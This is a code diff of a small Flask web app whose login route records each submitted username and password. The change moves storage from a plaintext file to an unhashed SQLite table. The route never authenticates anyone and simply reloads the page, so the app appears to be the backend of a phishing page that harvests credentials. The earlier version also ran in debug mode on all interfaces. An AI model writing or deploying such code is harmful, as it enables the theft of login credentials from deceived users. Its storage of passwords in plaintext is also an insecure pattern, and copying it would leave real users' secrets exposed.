@@ -1,26 +1,40 @@
 from flask import Flask, render_template, request, redirect
-import os
+import sqlite3
 
 app = Flask(__name__)
+
+# Create the database table (runs only once)
+def init_db():
+    conn = sqlite3.connect("logins.db")
+    c = conn.cursor()
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS logins (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            username TEXT NOT NULL,
+            password TEXT NOT NULL
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
+init_db()  # initialize DB at app start
 
 @app.route("/", methods=["GET", "POST"])
 def login():
     if request.method == "POST":
         username = request.form.get("username")
         password = request.form.get("password")
-        
-        with open("credentials.txt", "a") as f:
-            f.write(f"{username} | {password}\n")
-        
-        return redirect("/")  # Reload the page
+
+        # Save to SQLite DB
+        conn = sqlite3.connect("logins.db")
+        c = conn.cursor()
+        c.execute("INSERT INTO logins (username, password) VALUES (?, ?)", (username, password))
+        conn.commit()
+        conn.close()
+
+        return redirect("/")  # refresh
 
     return render_template("index.html")
 
 if __name__ == "__main__":
-    if not os.path.exists("credentials.txt"):
-        open("credentials.txt", "w").close()
-
-    app.run(host='0.0.0.0', port=5000, debug=True)
-
-
-
+    app.run()
